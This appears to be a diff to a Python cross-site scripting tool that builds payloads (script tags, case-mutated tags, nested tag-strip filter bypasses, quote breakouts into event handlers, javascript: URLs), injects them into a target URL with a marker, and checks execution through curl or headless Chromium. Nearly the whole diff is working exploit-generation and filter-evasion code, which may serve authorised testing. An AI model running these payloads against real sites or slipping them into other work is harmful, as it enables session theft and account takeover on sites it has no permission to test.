@@ -212,11 +212,19 @@ def avail_funcs(kw):
     return funcs
 
 
-def compose(ctx, quote, scores, kw=None, kwv=None):
+# DOM sinks that insert markup via innerHTML-style APIs: a <script> element
+# created this way is inert per the HTML spec — it never executes, so script
+# payloads must not be emitted for these sinks (event-handler tags do fire).
+INERT_SCRIPT_SINKS = ("innerhtml", "outerhtml", "insertadjacenthtml",
+                      "createcontextualfragment")
+
+
+def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     """Assemble candidate payloads from grammar primitives.
     kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
     kwv: {name: (expected, got_back)} — the actual probed strings, needed to
     build nested splitters from whatever string the filter deleted.
+    inert: sink inserts markup without running scripts (innerHTML-family).
     Returns list of dicts: {payload, technique, case_ref, efficiency}."""
     kw = kw or {}
     kwv = kwv or {}
@@ -273,19 +281,20 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                     return [split_str("alert", s) + "`1`"]
                 return []
 
-            if script_ok:
-                for fn in funcs or (rebuild_fn(rsplit[0]) if rsplit else []):
-                    add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
-            else:
-                if kw.get("case_script", True):
-                    for fn in funcs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
-                        add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
-                            "case-mutated script tag", "tag_removed")
-                for s in rsplit[:3]:
-                    for fn in funcs[:2] or rebuild_fn(s):
-                        add(f"{split_str('<script>', s)} {marker}>{fn}"
-                            f"{split_str('</script>', s)}",
-                            f"nested tag-strip bypass ({s} splitter)", "tag_removed")
+            if not inert:
+                if script_ok:
+                    for fn in funcs or (rebuild_fn(rsplit[0]) if rsplit else []):
+                        add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
+                else:
+                    if kw.get("case_script", True):
+                        for fn in funcs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
+                            add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
+                                "case-mutated script tag", "tag_removed")
+                    for s in rsplit[:3]:
+                        for fn in funcs[:2] or rebuild_fn(s):
+                            add(f"{split_str('<script>', s)} {marker}>{fn}"
+                                f"{split_str('</script>', s)}",
+                                f"nested tag-strip bypass ({s} splitter)", "tag_removed")
             for tag, ev, extra, deps in TAG_HANDLERS:
                 if all(kw.get(d, True) for d in deps):
                     for fn in funcs[:2]:
@@ -392,14 +401,17 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                     "handler close-call breakout", "breakout_tag")
 
     elif ctx == "attr_url":
-        if kw.get("javascript_proto", True):
-            for fn in funcs:
-                add(f'javascript:{fn}/*{marker}*/', "javascript: URL direct", "protocol")
+        # breakout first: a quote+tag escape works in ANY url attribute
+        # (src=, href= alike) and fires without user interaction, whereas
+        # javascript: needs href= + a click and is dead in src=/data=.
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
                 for fn in funcs[:2]:
                     add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
                         "url-attr breakout -> tag", "breakout_tag")
+        if kw.get("javascript_proto", True):
+            for fn in funcs:
+                add(f'javascript:{fn}/*{marker}*/', "javascript: URL direct", "protocol")
 
     elif ctx == "attr_srcdoc":
         if kw.get("entity_lt", True):
@@ -469,11 +481,16 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
 
 class MarkerDomCheck(HTMLParser):
     """Walk the response; record whether the marker element sits in an
-    executable position (on* handler, script body, javascript:/data: URL)."""
+    executable position (on* handler, script body, javascript:/data: URL).
+    script_inert: mark <script> position as NON-executable — used on rendered
+    DOM where a script-bearing marker reached this point only because nothing
+    fired (innerHTML/insertAdjacentHTML-inserted scripts never execute). A
+    script that truly ran was already caught by the alert-hook 'fired' list."""
 
-    def __init__(self, marker):
+    def __init__(self, marker, script_inert=False):
         super().__init__(convert_charrefs=False)
         self.marker = marker
+        self.script_inert = script_inert
         self.executable = False
         self.evidence = ""
         self._in_script = False
@@ -497,7 +514,7 @@ class MarkerDomCheck(HTMLParser):
                                                  v, re.I):
                 self.executable = True
                 self.evidence = "marker inside <iframe srcdoc> executable HTML"
-        if tag == "script":
+        if tag == "script" and not self.script_inert:
             self.executable = True
             self.evidence = "marker inside <script> element"
 
@@ -506,18 +523,46 @@ class MarkerDomCheck(HTMLParser):
             self._in_script = False
 
     def handle_data(self, data):
-        if self._in_script and self.marker in data:
+        if self._in_script and not self.script_inert and self.marker in data:
             self.executable = True
             self.evidence = "marker inside <script> body"
 
 
-def verify_payload(url, payload):
-    """Inject payload with marker; grade V (executable) or R (reflected)."""
+def verify_payload(url, payload, render=False):
+    """Inject payload with marker; grade V (executable) or R (reflected).
+    render=True fetches via headless chromium — needed when the reflection
+    lives only in the DOM (document.write/innerHTML sinks), and captures
+    real execution via hooked alert/confirm/prompt/print calls."""
     marker = "vvm" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
     marked = payload.replace("vvm{id}", marker)
     if "vvm" not in marked:
         marked += f"<!--{marker}-->"
     target = url.replace(PLACEHOLDER, quote(marked, safe=""))
+
+    if render:
+        try:
+            from send_payloads import fetch_rendered
+            body, rmeta = fetch_rendered(target)
+        except Exception as e:
+            return {"payload": marked, "confidence": "error",
+                    "evidence": f"render failed: {e}"}
+        fired = rmeta.get("fired") or []
+        sink_hits = [n for n, a in rmeta.get("sinks", []) if marker in a]
+        if fired:
+            return {"payload": marked, "confidence": "V",
+                    "evidence": "executed: " + "; ".join(fired[:3])}
+        if marker not in body and not sink_hits:
+            return {"payload": marked, "confidence": "none",
+                    "evidence": "payload not reflected (rendered DOM)"}
+        chk = MarkerDomCheck(marker, script_inert=True)
+        chk.feed(body)
+        if chk.executable:
+            return {"payload": marked, "confidence": "V",
+                    "evidence": chk.evidence}
+        ev = ("marker reached sink: " + ", ".join(sorted(set(sink_hits)))
+              if sink_hits else "marker reflected but not in executable position")
+        return {"payload": marked, "confidence": "R", "evidence": ev}
+
     try:
         body = subprocess.run(
             ["curl", "-s", "-k", "--max-time", "15", "-A",
@@ -548,6 +593,10 @@ def main():
                                        "(default: latest in Skills/log/, if any)")
     ap.add_argument("--verify", action="store_true",
                     help="inject top payloads with a marker and grade R/V")
+    ap.add_argument("--render", action="store_true",
+                    help="verify via rendered DOM (headless chromium) — for "
+                         "DOM sinks like document.write(location.search); "
+                         "auto-enabled when the analysis came from --render")
     ap.add_argument("--top", type=int, default=3,
                     help="max payload candidates per reflection (default 3)")
     args = ap.parse_args()
@@ -590,14 +639,19 @@ def main():
               "reflections": []}
 
     for rid in refl_ids:
-        ctxs = [k for r in results if r["reflection_index"] == rid
-                for k in normalize_contexts(r["contexts"])]
+        raw_ctxs = [c for r in results if r["reflection_index"] == rid
+                    for c in r["contexts"]]
+        ctxs = [k for c in raw_ctxs for k in normalize_contexts([c])]
         ctx = ctxs[0]
+        # "dom sink: innerHTML (html body)" -> inert scripts never execute
+        m_sink = next((m for c in raw_ctxs
+                       if (m := re.search(r"dom sink:\s*([\w:.-]+)", c))), None)
+        inert = bool(m_sink) and m_sink.group(1).lower() in INERT_SCRIPT_SINKS
         scores = char_scores(results, rid)
         kw = kw_by_refl.get(rid, {})
         kwv = kwv_by_refl.get(rid, {})
         quote_ch = detect_quote(source_html, "testing1")
-        cand = compose(ctx, quote_ch, scores, kw, kwv)
+        cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert)
         # rank on equal efficiency: direct payloads execute as-is;
         # splitter probes test THIS filter's actual deletion set;
         # blind mutations (case/entity) are last-resort guesses.
@@ -635,8 +689,10 @@ def main():
             if not args.url or PLACEHOLDER not in (args.url or ""):
                 print("    [!] --verify needs --url containing {xss_testing}")
             else:
-                print("    verifying top payloads...")
-                verified = [verify_payload(args.url, c["payload"]) for c in cand]
+                render = args.render or analysis.get("probe_mode") == "render"
+                print(f"    verifying top payloads{render and ' (rendered DOM)' or ''}...")
+                verified = [verify_payload(args.url, c["payload"], render=render)
+                            for c in cand]
                 entry["verification"] = verified
                 for v in verified:
                     print(f"        [{v['confidence']}] {v['payload']}")
